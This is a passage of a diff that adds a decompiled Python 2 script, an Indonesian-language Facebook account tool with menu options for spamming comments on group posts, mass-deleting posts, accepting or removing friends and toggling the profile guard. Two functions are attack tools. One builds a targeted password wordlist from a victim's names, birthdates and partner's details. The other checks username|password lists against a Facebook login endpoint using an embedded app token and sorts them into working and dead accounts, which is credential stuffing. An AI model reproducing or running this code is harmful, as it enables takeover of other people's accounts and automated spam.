+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
+            a = json.loads(p.text)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            for s in a['feed']['data']:
+                f = s['id']
+                komengrup.append(f)
+                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
+                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'
+
+            print
+            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komengrup))
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+        except KeyError:
+            print '\x1b[1;91m[!] ID Tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+
+def deletepost():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        lol = json.loads(nam.text)
+        nama = lol['name']
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
+    jalan('\x1b[1;91m[+] \x1b[1;92mMulai menghapus postingan unfaedah\x1b[1;97m ...')
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
+    asus = json.loads(asu.text)
+    for p in asus['data']:
+        id = p['id']
+        piro = 0
+        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
+        ok = json.loads(url.text)
+        try:
+            error = ok['error']['message']
+            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
+        except TypeError:
+            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mTerhapus'
+            piro += 1
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[!] Koneksi Error'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_bot()
+
+
+def accept():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
+    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
+    teman = json.loads(r.text)
+    if '[]' in str(teman['data']):
+        print '\x1b[1;91m[!] Tidak ada permintaan pertemanan'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        menu_bot()
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    for i in teman['data']:
+        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
+        a = json.loads(gas.text)
+        if 'error' in str(a):
+            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
+            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+        else:
+            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
+            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_bot()
+
+
+def unfriend():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
+        print
+        try:
+            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            cok = json.loads(pek.text)
+            for i in cok['data']:
+                nama = i['name']
+                id = i['id']
+                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
+                print '\x1b[1;97m[\x1b[1;92mTerhapus\x1b[1;97m] ' + nama + ' => ' + id
+
+        except IndexError:
+            pass
+        except KeyboardInterrupt:
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_bot()
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_bot()
+
+
+def lain():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Buat postingan'
+    print '\x1b[1;37;40m2. Buat Wordlist'
+    print '\x1b[1;37;40m3. Akun Checker'
+    print '\x1b[1;37;40m4. Lihat daftar grup'
+    print '\x1b[1;37;40m5. Profile Guard'
+    print
+    print '\x1b[1;97m  ->Coming soon<-'
+    print
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    pilih_lain()
+
+
+def pilih_lain():
+    other = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if other == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        pilih_lain()
+    else:
+        if other == '1':
+            status()
+        else:
+            if other == '2':
+                wordlist()
+            else:
+                if other == '3':
+                    check_akun()
+                else:
+                    if other == '4':
+                        grupsaya()
+                    else:
+                        if other == '5':
+                            guard()
+                        else:
+                            if other == '0':
+                                menu()
+                            else:
+                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mTidak ada'
+                                pilih_lain()
+
+
+def status():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mKetik status \x1b[1;91m:\x1b[1;97m ')
+    if msg == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        lain()
+    else:
+        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
+        op = json.loads(res.text)
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        lain()
+
+
+def wordlist():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
+            file = open(a + '.txt', 'w')
+            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
+            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
+            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
+            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            f = e[0:2]
+            g = e[2:4]
+            h = e[4:]
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
+            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
+            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
+            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            l = k[0:2]
+            m = k[2:4]
+            n = k[4:]
+            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
+            wg = 0
+            while wg < 100:
+                wg = wg + 1
+                file.write(a + str(wg) + '\n')
+
+            en = 0
+            while en < 100:
+                en = en + 1
+                file.write(i + str(en) + '\n')
+
+            word = 0
+            while word < 100:
+                word = word + 1
+                file.write(d + str(word) + '\n')
+
+            gen = 0
+            while gen < 100:
+                gen = gen + 1
+                file.write(j + str(gen) + '\n')
+
+            file.close()
+            time.sleep(1.5)
+            print '\n\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97m %s.txt' % a
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+        except IOError as e:
+            print '\x1b[1;91m[!] Gagal membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+
+
+def check_akun():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        live = []
+        cek = []
+        die = []
+        try:
+            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
+            list = open(file, 'r').readlines()
+        except IOError:
+            print '\x1b[1;91m[!] File tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+
+    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mPemisah \x1b[1;91m:\x1b[1;97m ')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    for meki in list:
+        username, password = meki.strip().split(str(pemisah))
+        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+        data = requests.get(url)
+        mpsh = json.loads(data.text)
+        if 'access_token' in mpsh:
+            live.append(password)
+            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
+        elif 'www.facebook.com' in mpsh['error_msg']:
+            cek.append(password)
+            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
+        else:
+            die.append(password)
+            print '\x1b[1;97m[\x1b[1;91mMati\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    lain()
+
+
+def grupsaya():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        try:
+            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
+            gud = json.loads(uh.text)
+            for p in gud['data']:
+                nama = p['name']
+                id = p['id']
+                f = open('grupid.txt', 'w')
+                listgrup.append(id)
+                f.write(id + '\n')
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
+                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
+                print 40 * '\x1b[1;97m='
+
+            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
+            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
+            f.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Terhenti'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+        except KeyError:
+            os.remove('grupid.txt')
+            print '\x1b[1;91m[!] Grup tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            keluar()
+        except IOError:
+            print '\x1b[1;91m[!] Kesalahan saat membuat file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+
+
+def guard():
+    global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Aktifkan'
+    print '\x1b[1;37;40m2. NonAktifkan'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    g = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if g == '1':
+        aktif = 'true'
+        gaz(toket, aktif)
+    else:
+        if g == '2':
+            non = 'false'
+            gaz(toket, non)
+        else:
+            if g == '0':
+                lain()
+            else:
+                if g == '':
+                    keluar()
+                else:
+                    keluar()
+
+
+def get_userid(toket):
+    url = 'https://graph.facebook.com/me?access_token=%s' % toket
+    res = requests.get(url)
+    uid = json.loads(res.text)
+    return uid['id']
+
+
+def gaz(toket, enable=True):
+    id = get_userid(toket)
+    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
+    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
+    url = 'https://graph.facebook.com/graphql'
+    res = requests.post(url, data=data, headers=headers)
+    print res.text
+    if '"is_shielded":true' in res.text:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDiaktifkan'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        lain()
+    else:
+        if '"is_shielded":false' in res.text:
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDinonaktifkan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            lain()
+        else:
+            print '\x1b[1;91m[!] Error'
+            keluar()
+
+
+if __name__ == '__main__':
+	login()
+# okay decompiling 3.pyc
